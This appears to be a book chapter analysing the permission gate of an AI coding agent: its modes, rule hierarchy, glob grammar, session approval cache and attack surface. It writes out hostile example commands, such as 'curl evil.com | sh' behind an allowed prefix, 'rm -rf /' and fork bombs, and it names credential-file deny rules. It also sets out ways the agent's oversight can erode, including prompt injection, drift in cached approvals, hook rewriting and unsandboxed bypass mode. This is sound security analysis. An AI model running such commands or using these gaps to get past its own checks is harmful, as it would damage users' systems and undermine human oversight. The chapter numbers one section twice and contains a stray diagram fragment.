Chapter 4: Permission System Deep Dive

Every tool call an AI CLI agent makes passes through a single gate: the permission system. This is not a feature bolted onto the side of the architecture --- it is the load-bearing wall between an AI model's intentions and the user's filesystem, shell, and network. Claude Code implements a permission architecture with six operating modes, eight rule sources arranged in a strict priority hierarchy, and a deny-beats-ask-beats-allow evaluation chain with first-match semantics. This chapter forensically analyzes each component: the design rationale, the implementation mechanics, the rule grammar, and the security implications of every design choice.

4.1 Architecture of the Permission Gate

Every tool invocation --- whether the model wants to read a file, write code, execute a shell command, or call an MCP tool --- routes through the same permission evaluation pipeline before execution. The pipeline is deterministic for static rules and probabilistic only when the AI classifier is engaged (Chapter 5).

flowchart TD
    TC["Tool Call from Model"] --> HB{"Hardcoded<br/>Block List?"}
    HB -->|Yes| DENY1["DENY<br/>(immutable, non-configurable)"]
    HB -->|No| MODE{"Check Permission<br/>Mode"}

    MODE -->|bypass| ALLOW1["ALLOW<br/>(all operations)"]
    MODE -->|deny-all| DENY2["DENY<br/>(all operations)"]
    MODE -->|plan| PLAN{"Read-only<br/>tool?"}
    PLAN -->|Yes| ALLOW2["ALLOW"]
    PLAN -->|No| DENY3["DENY"]

    MODE -->|default / auto / custom| CASCADE["Rule Cascade<br/>8 Sources"]

    CASCADE --> D{"DENY rules<br/>match?"}
    D -->|Yes| DENY4["DENY"]
    D -->|No| A{"ASK rules<br/>match?"}
    A -->|Yes| ASK["ASK user<br/>(or classifier)"]
    A -->|No| AL{"ALLOW rules<br/>match?"}
    AL -->|Yes| ALLOW3["ALLOW"]
    AL -->|No| DEFAULT["Default for<br/>tool type"]

The hardcoded block list sits above the mode check. This is deliberate: certain operations --- rm -rf /, fork bombs, curl | sh piped to a shell interpreter --- are blocked regardless of mode, user configuration, or enterprise policy. These represent catastrophic-damage commands that no legitimate AI agent workflow requires. They are the bypass-immune floor.

The critical security property: the hardcoded block list cannot be disabled by any configuration source. Not by enterprise policy. Not by settings.local.json. Not by bypass mode. This is the one layer that survives even a complete compromise of the configuration system (CWE-284: Improper Access Control).

4.2 The Six Permission Modes

Claude Code provides six permission modes arranged on a spectrum from maximum restriction to maximum autonomy. Each mode represents a different answer to the question: "When the AI wants to do something risky, what happens?"

Mode Reads Writes Shell Decision Maker Use Case
deny-all Blocked Blocked Blocked Nobody (all denied) Security audit, compliance review
plan Allowed Blocked until plan approved Blocked until approved User (post-plan) Architecture analysis, code review
default Allowed Ask user Ask user User (per-action) Conservative development
auto Allowed AI classifier decides AI classifier decides AI classifier Productive development
custom Per-rule Per-rule Per-rule Rules + user Enterprise deployments
bypass Allowed Allowed Allowed Nobody (all allowed) Sandboxed CI/CD, containers

deny-all Mode

Deny-all blocks everything, including reads. Its purpose is not usability --- it is auditability. When the agent runs in deny-all mode, it proposes tool calls, receives denial responses, and adapts. Security auditors can observe the agent's complete decision tree without any actual execution.

Security implication: Deny-all mode reveals what the agent would do if granted permission. This is valuable for threat modeling (Chapter 3) but also reveals the agent's attack surface to an observer. In a shared-screen environment, deny-all mode could expose internal reasoning that the user might not want visible.

plan Mode

Plan mode creates a two-phase workflow: explore (reads allowed), then execute (writes require approval). The agent can read files, search codebases, and analyze architecture. But file writes, shell commands, and destructive operations are blocked until the user reviews and approves a plan.

Security implication: The plan-to-execution transition is a single binary gate. Once approved, the execution phase behavior depends on what the mode transitions to (typically default or auto). A malicious prompt injection that executes during the exploration phase cannot modify files, but it can read sensitive data and include it in the plan output. The read-is-safe assumption baked into plan mode does not hold when file contents include secrets (CWE-200: Exposure of Sensitive Information).

default Mode

Default mode is the workhorse. Read operations proceed silently. Write operations and shell commands prompt the user. The user approves or denies each action individually.

The session memory cache (Section 4.5) transforms default mode from unusable to practical. When the user approves Bash(git diff *), the system generalizes and caches the pattern. Subsequent git diff variants auto-approve without prompting.

Security implication: Session memory creates a progressive trust accumulation. Early in a session, the user is attentive and evaluates each prompt. Late in a session, accumulated approvals may auto-approve operations the user would not have approved if asked fresh. This is the session drift problem --- the security posture at minute 90 is weaker than at minute 1.

auto Mode

Auto mode replaces the user prompt with an AI classifier (Chapter 5). The classifier evaluates each tool call against the current context and returns allow, deny, or soft-deny. The user is not interrupted for routine operations.

Security implication: The AI classifier introduces probabilistic behavior into the permission system. Two identical commands in two identical sessions may receive different verdicts due to model temperature. This is acceptable only because the classifier operates on top of the deterministic rule cascade --- the hard security boundaries (deny lists, blocked patterns) are never bypassed by the classifier. The classifier is a UX optimization, not a security boundary.

custom Mode

Custom mode evaluates user-defined rule sets: allow specific commands, deny specific paths, ask for everything else. This is the enterprise escape hatch.

Security implication: Custom rules inherit the full complexity of the rule grammar (Section 4.4). Misconfigured rules can create gaps. Bash(git *) allows git push --force main alongside git log. The user must understand glob semantics to write safe rules. This is the classic policy-complexity problem (CWE-863: Incorrect Authorization).

bypass Mode

Bypass mode auto-approves everything. It exists for sandboxed environments --- CI/CD containers, ephemeral VMs, disposable filesystems --- where the blast radius is contained by external controls.

Security implication: Bypass mode should never be active on a developer's workstation with a real home directory. The implementation gates bypass activation behind a --dangerously-bypass-permissions flag that is intentionally verbose. But no runtime check verifies that the environment is actually sandboxed. A user who passes the flag on their workstation gets bypass mode on their production filesystem. The flag's length is the only defense --- there is no enforcement of the containment assumption (CWE-269: Improper Privilege Management).

4.3 The Eight Rule Sources

Rules come from eight sources, arranged in strict priority order. Higher-priority sources dominate lower-priority sources. Within each source, deny rules are checked before ask rules, which are checked before allow rules.

graph TD
    subgraph "Priority Hierarchy (Highest → Lowest)"
        S1["1. Policy (MDM/Enterprise)"] --> S2["2. Managed (Org Settings)"]
        S2 --> S3["3. User (~/.config/claude/settings.json)"]
        S3 --> S4["4. Project (.claude/settings.json)"]
        S4 --> S5["5. Local (.claude/settings.local.json)"]
        S5 --> S6["6. Plugin (Extension Manifests)"]
        S6 --> S7["7. Hook (Runtime Decisions)"]
        S7 --> S8["8. Built-in (Hardcoded Defaults)"]
    end

    S1 -.- N1["Cannot be overridden by anything"]
    S4 -.- N4["Comes from version control —<br/>requires user trust approval"]
    S5 -.- N5["Gitignored — developer overrides"]
    S8 -.- N8["Safety floor — reads auto-allow,<br/>writes ask, destructive deny"]

Source 1: Policy (MDM/Enterprise)

Delivered via macOS configuration profiles, Windows Group Policy, or Linux-managed config files. These rules are set by enterprise administrators and cannot be overridden by any other source. Not by the user. Not by the project. Not by local settings.

Security assessment: Policy rules represent the compliance hammer. When they work, they enforce organizational security boundaries absolutely. The weakness is enforcement verification: how does the system confirm that a policy file was genuinely delivered by MDM and not placed by a malicious actor with write access to the config directory? The current implementation trusts the filesystem path. If an attacker can write to the policy config directory, they can inject policy rules (CWE-427: Uncontrolled Search Path Element).

Source 2: Managed Settings

Organization-level settings pushed from a centralized management server. Less forceful than policy --- managed settings establish defaults that individual users can tighten but not loosen.

Security assessment: The one-way ratchet --- tighten but not loosen --- is the critical property. A managed deny rule cannot be overridden by user allow rules. But a managed allow rule can be overridden by user deny rules. This asymmetry is correct: organizations set the security floor, users raise it.

The allowManagedPermissionRulesOnly: true flag disables all non-managed permission rules. This is the nuclear option for high-security environments. When active, user rules, project rules, and local rules are all ignored.

Source 3: User Settings

Per-user settings stored in ~/.config/claude/settings.json. These travel with the user across projects.

Security assessment: User settings are as secure as the user's home directory. On a multi-user system, another user with read access to the settings file can observe the permission policy. On a single-user system, the threat is malware with write access modifying user settings to weaken the security posture.

Source 4: Project Settings

Per-project settings committed to version control at .claude/settings.json. Every contributor shares these rules.

Security assessment: This is the most dangerous source because it comes from other people. A malicious contributor can commit settings that allow: ["Bash(*)"], granting the agent unrestricted shell access. The defense is the project approval gate: project-sourced rules require explicit user confirmation before taking effect. The confirmation is stored in user settings (Source 3), so a malicious project cannot approve itself.

The approval gate checks a hash of the project settings. If the settings change (a contributor modifies the committed file), the user is re-prompted. This is correct but creates a usability burden in active repositories where settings change frequently.

Residual risk: The approval gate presents the settings content for user review. But users presented with a wall of JSON after cloning a repository are likely to approve without careful reading. This is the "click OK" problem that plagues every confirmation dialog (CWE-356: UI Misrepresentation of Critical Information).

Source 5: Local Settings

Per-project settings that are gitignored (.claude/settings.local.json). Developer overrides that do not affect the team.

Security assessment: Local settings are the common escape hatch for developers who find project settings too restrictive. A Bash(*) rule in local settings grants unrestricted shell access. Since the file is local and gitignored, there is no team review. The security posture of the system now depends entirely on one developer's settings hygiene.

Source 6: Plugin Rules

Permissions bundled with installed plugins or extensions.

Security assessment: Plugins can only add allow rules, not deny rules. Plugin allow rules have lower priority than user, project, or local deny rules. Plugin tools are namespaced (mcp__plugin_name__tool_name) so rules can target them specifically. These constraints limit the blast radius of a malicious plugin, but a plugin that requests Bash(*) still gets full shell access unless blocked by a higher-priority deny rule.

Source 7: Hook Decisions

Runtime permission decisions from hook scripts. Hooks fire before tool execution and can allow, deny, or modify the permission decision via exit codes and structured JSON output.

Security assessment: Hooks are executable code. A PreToolUse hook that returns exit code 2 blocks execution. A hook that returns updatedInput can rewrite tool arguments before execution. This makes hooks both powerful and dangerous: a compromised hook can silently rewrite commands. The mitigation is allowManagedHooksOnly: true, which restricts hooks to those defined in managed settings.

Critical invariant: A hook's allow decision with updatedInput does NOT bypass settings.json deny rules. The modified input is re-evaluated against the rule cascade. This prevents hooks from smuggling dangerous commands past the permission system.

Source 8: Built-in Defaults

Hardcoded defaults: read-only tools auto-allow, write tools ask, known dangerous patterns deny.

Security assessment: The safety floor. Even with zero configuration, the system behaves safely. The weakness is that "known dangerous patterns" is a finite list. Novel attack vectors not in the list pass through to the default ask/allow behavior.

4.4 The Rule Grammar

Permission rules use a Tool(pattern) grammar with glob-based pattern matching. This is a deliberate UX choice: developers know globs from .gitignore and shell expansion. The grammar is simpler than a full policy language (Rego, Cedar, OPA) but expressive enough for 95% of use cases.

Syntax

Rule     := ToolName "(" Pattern ")"
ToolName := "Bash" | "Read" | "Write" | "Edit" | "Glob" | "Grep" 
          | "WebFetch" | "WebSearch" | "NotebookEdit" 
          | "mcp__" ServerName "__" ToolName
Pattern  := GlobExpression

Examples:

{
  "permissions": {
    "allow": [
      "Bash(git diff *)",
      "Bash(npm test)",
      "Bash(cargo build *)",
      "Read(src/**)",
      "Write(src/**/*.ts)"
    ],
    "deny": [
      "Read(./.env)",
      "Read(./.env*)",
      "Read(~/.ssh/*)",
      "Bash(rm -rf /)",
      "Bash(git push --force *)",
      "Write(vendor/**)"
    ]
  }
}

Glob Semantics

The glob matching follows standard filesystem glob conventions:

Pattern Matches Does Not Match
* Any single path segment Multi-segment paths
** Any number of path segments (matches everything)
? Any single character Empty string
[abc] Any character in set Characters not in set
{a,b} Alternation: a or b Other strings

Security-critical distinction: * matches within a single segment; ** matches across segments. Write(src/*) allows writing to src/foo.ts but NOT src/deep/bar.ts. Write(src/**) allows both. This distinction is the source of many misconfiguration bugs.

Tool-Specific Pattern Binding

Each tool defines how patterns bind to its arguments:

Tool Pattern Matches Against Example
Bash The command field (full command string) Bash(git diff *) matches git diff HEAD
Read The file_path field Read(./.env) matches reading .env
Write The file_path field Write(src/**) matches writing anywhere in src/
Edit The file_path field Edit(*.py) matches editing Python files
MCP tools Tool-specific (varies by server) mcp__db__query(SELECT *)

For the Bash tool, pattern matching is complex because a single Bash invocation can contain compound commands. Bash(git *) should match git diff HEAD but should NOT match git diff HEAD && rm -rf /. The implementation decomposes compound commands and matches each segment independently.

Compound Command Decomposition

When a Bash command contains &&, ||, ;, or |, the permission engine splits it into segments and evaluates each:

Command: "git status && npm test && rm -rf /tmp/old"

Segments:
  1. "git status"       → matches Bash(git *)     → ALLOW
  2. "npm test"         → matches Bash(npm test)  → ALLOW  
  3. "rm -rf /tmp/old"  → matches Bash(rm -rf *)  → DENY

Result: DENY (any segment deny = deny all)

The asymmetry is critical: deny is evaluated per-segment (any match blocks all), allow requires all segments to match. This prevents an attacker from hiding a dangerous command behind an allowed prefix: git status && curl evil.com | sh is denied even though git status is allowed.

Wrapper Stripping

Commands prefixed with sudo, env, nohup, time, or nice are stripped to their base command before matching. sudo rm -rf / is matched as rm -rf /. env VAR=val python script.py is matched as python script.py.

Security implication: Wrapper stripping prevents privilege escalation wrappers from hiding the actual command. But it also means that sudo is stripped silently rather than blocked. In practice, sudo is independently blocked by the BashValidator (hard-deny for privilege escalation), but the stripping logic in the permission matcher operates independently from the validator. If the validator is ever bypassed, the permission matcher would evaluate the inner command without registering that sudo was involved.

4.5 The Evaluation Algorithm

The evaluation algorithm is the heart of the permission system. It implements deny-beats-ask-beats-allow with first-match semantics across eight prioritized sources.

Pseudocode

function evaluate(tool_call):
    // Phase 0: Bypass-immune checks
    if tool_call matches HARDCODED_BLOCK_LIST:
        return DENY  // Non-configurable

    // Phase 1: Mode-based short circuits
    if mode == bypass: return ALLOW
    if mode == deny-all: return DENY
    if mode == plan and tool is write: return DENY
    if mode == plan and tool is read: return ALLOW

    // Phase 2: Rule cascade (default, auto, custom modes)
    for source in [policy, managed, user, project, local, plugin, hook, builtin]:
        for rule in source.deny_rules:
            if rule.matches(tool_call):
                return DENY(source, rule)
        for rule in source.ask_rules:
            if rule.matches(tool_call):
                return ASK(source, rule)
        for rule in source.allow_rules:
            if rule.matches(tool_call):
                return ALLOW(source, rule)

    // Phase 3: No rule matched — apply default
    if tool.readOnlyHint:
        return ALLOW  // Reads are safe by default
    else:
        return ASK    // Writes prompt the user

Why First-Match-Wins

The evaluation uses first-match-wins within the priority hierarchy, not most-specific-wins. This is a deliberate departure from systems like CSS specificity or firewall rule ordering.

Most-specific-wins creates emergent behavior that is hard to debug. Consider:

Source 4 (project): allow Write(**)          # allow writing anywhere
Source 4 (project): deny  Write(vendor/**)   # except vendor
Source 5 (local):   allow Write(vendor/patches/**)  # but allow vendor patches

With most-specific-wins, the specificity of vendor/patches/** vs. vendor/** vs. ** determines the outcome, and that ranking depends on the specificity algorithm's implementation. Different algorithms (longest prefix, deepest glob, most literal characters) produce different results.

With first-match-wins and source priority, the behavior is mechanical: Source 4's deny for vendor/** fires before Source 5's allow for vendor/patches/** because Source 4 has higher priority. The result is always DENY, regardless of specificity. To allow vendor/patches/**, the allow rule must be placed at Source 4 or higher.

Security implication: First-match-wins is more restrictive but more predictable. A deny rule at a high-priority source cannot be overridden by any lower-priority source. This makes the system easier to audit: you scan sources top-down and the first matching rule is the decision. There is exactly one rule responsible for every decision.

The Decision Trace

Every permission decision produces a trace for debugging:

Permission decision for: Bash("docker build -t myapp .")

Source     | Rules Checked              | Match?
-----------|---------------------------|--------
policy     | (none)                    | -
managed    | (none)                    | -
user       | deny: Bash(docker rm *)   | No match
           | allow: Bash(docker build *)| MATCH → ALLOW
project    | (not reached)             | -
...

Decision: ALLOW (source: user, rule: "Bash(docker build *)")

This trace is accessible via --permission-debug and is essential for diagnosing unexpected denials. Without it, permission debugging degenerates into trial and error.

4.5 Session Memory and Progressive Trust

The session memory cache transforms the permission system from theoretically correct but practically unusable into something developers actually tolerate.

How Session Memory Works

When the user approves a tool call in default mode, the system extracts a pattern from the approved command and caches the approval:

User approves: Bash("git diff --cached")
System caches: Bash(git diff *) → ALLOW

User approves: Write("src/components/Button.tsx")
System caches: Write(src/**) → ALLOW  (generalized from specific path)

Pattern generalization is risk-aware. Read-only commands generalize broadly (git diff --cached → git *), because all git-read operations have similar risk profiles. Write commands generalize narrowly (src/components/Button.tsx → src/**), because write targets vary dramatically in risk.

Cache Properties

Property Behavior Rationale
Scope Session-only A session compromise cannot permanently weaken permissions
Persistence Resets on session end, /clear, mode change Clean slate per session
Generalization Risk-aware pattern widening Balance usability with precision
Override Cannot override deny rules Deny is absolute regardless of cache

The Progressive Trust Problem

Session memory creates a progressive trust accumulation. As the session continues, more patterns are cached, fewer prompts appear, and the effective security posture weakens. At minute 1, the user evaluates every action. At minute 90, most actions auto-approve through cache hits.

This is by design --- it aligns prompt frequency with user attention. But it creates a vulnerability window: if the model's behavior changes late in a session (due to context poisoning, prompt injection, or model drift), the accumulated cache may auto-approve operations the user would reject if prompted fresh.

Mitigations: 1. Risk-based cache bypass. High-risk operations (flagged by the command classifier as Destructive) always prompt, regardless of cache. 2. Cache TTL. Cache entries can optionally expire after N minutes of inactivity, forcing re-approval for patterns not recently used. 3. Anomaly detection. Operations that differ significantly from the session's established patterns trigger fresh prompts even when the pattern technically matches a cached rule.

4.6 Subagent Permission Scoping

When the main agent spawns a subagent, the subagent's permissions are strictly scoped. Two principles govern this:

No privilege escalation. A subagent cannot have more permissions than its parent. If the parent runs in default mode, the subagent cannot run in bypass mode. If the parent denies Write(.env), the subagent inherits that denial.

Clean permission slate. Session-memory approvals from the parent do not transfer to the subagent. Each subagent starts with only the permissions explicitly granted in its agent definition. The rationale: session memory represents the user's trust in the parent agent's judgment. That trust does not automatically extend to subagents with different system prompts and behavioral tendencies.

    Parent --> Sub2["Subagent 2<br/>tools: Read, Bash<br/>cache: empty"]

Security implication: Subagent permission scoping is the primary defense against confused deputy attacks in multi-agent architectures. A malicious MCP tool result that tricks the parent into spawning a subagent cannot leverage the parent's accumulated trust.

4.7 The Bypass-Immune Layer

Certain protections remain active even in bypass mode. These constitute the absolute security floor:

Protection What It Guards Mode Override?
Hardcoded block list rm -rf /, fork bombs, curl \| sh No --- active in all modes
.git/ directory write protection Repository integrity No
.claude/ write protection Agent configuration integrity No
Shell config file protection .bashrc, .zshrc, .profile No
sudo / privilege escalation block Root access prevention No

These bypass-immune checks execute before the mode is consulted. Even a settings.json with "permissions": {"allow": ["Bash(*)"]} cannot override them. They are the final defense against configuration errors, compromised settings files, and overly permissive policies.

Residual risk: The bypass-immune layer protects known critical paths. It does not protect unknown critical paths. A user's ~/.aws/credentials is not in the bypass-immune list (it may be covered by a deny rule, but deny rules are configurable). If all deny rules are removed, AWS credentials become readable. The bypass-immune layer only covers the hardcoded set.

4.8 Permission System Attack Surface

The permission system itself is an attack target. Every component introduces its own vulnerability surface:

Component Attack Vector CWE
Rule cascade Priority confusion leading to unintended allow CWE-863
Glob matching Overly broad patterns granting excessive access CWE-285
Project settings Malicious .claude/settings.json in cloned repo CWE-15
Session cache Progressive trust weakening over long sessions CWE-613
Wrapper stripping Incomplete stripping allowing command hiding CWE-78
Mode selection User choosing bypass on unsandboxed environment CWE-269
Pattern decomposition Incomplete splitting of compound commands CWE-77
Hook decisions Compromised hook allowing dangerous operations CWE-829

Chapter 6 provides detailed attack scenarios and mitigations for each vector.

Security Assessment

Strengths: - Deny-first evaluation with eight prioritized sources is architecturally sound. The first-match-wins semantics are predictable and auditable. - The bypass-immune layer provides a non-configurable safety floor that survives configuration compromise. - Subagent permission scoping implements least authority correctly, preventing privilege escalation across agent boundaries. - The decision trace makes every permission decision debuggable.

Weaknesses: - The project settings source (Source 4) is a supply-chain attack vector. The approval gate mitigates but does not eliminate the risk because users tend to approve without thorough review. - Session memory progressive trust creates a growing vulnerability window as sessions continue. The risk-based cache bypass only covers commands classified as Destructive --- commands classified as Write but actually dangerous can still benefit from cached approvals. - The glob grammar is powerful enough to create unintended permissions but not expressive enough to create precise policies. There is no way to express "allow git push only to non-protected branches" in glob syntax. - No formal verification of rule interactions. The system relies on testing and the decision trace for correctness validation. For complex multi-source configurations, emergent behavior is possible and difficult to predict. - Bypass mode has no runtime sandbox verification. The flag-length defense against accidental activation is insufficient for environments where scripts automate Claude Code invocation.

Research Gaps: - Formal policy verification: Can we prove that a given set of rules across eight sources never permits a specific operation? Tools like Alloy or TLA+ could model the rule cascade and check safety properties. - Contextual permission scoping: Rules that consider not just what tool is called but why --- linking permissions to the user's stated intent rather than the command's syntactic form. - Temporal permission decay: Automatic tightening of session-cached permissions as session duration increases, counteracting progressive trust accumulation. - Cross-session permission learning: Using historical approval patterns to suggest rule configurations that match the user's actual behavior, reducing both over-permission and prompt fatigue.
